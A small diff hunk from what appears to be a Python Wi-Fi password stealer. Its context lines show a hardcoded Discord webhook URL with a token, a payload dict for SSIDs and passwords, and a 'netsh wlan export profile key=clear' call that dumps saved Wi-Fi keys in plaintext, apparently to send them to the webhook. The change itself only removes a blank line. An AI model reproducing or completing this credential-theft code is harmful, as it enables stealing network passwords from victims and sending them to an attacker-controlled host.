@@ -5,7 +5,6 @@ url = 'https://discord.com/api/webhooks/1005181355619004517/7yrFrCV65AxWeliU880p
 wifi_files = []
 payload = {"SSID":[], "Password":[]}
 
-
 command_output = subprocess.run(["netsh", "wlan", "export", "profile", "key=clear"], capture_output = True).stdout.decode()
 
 path = os.getcwd()
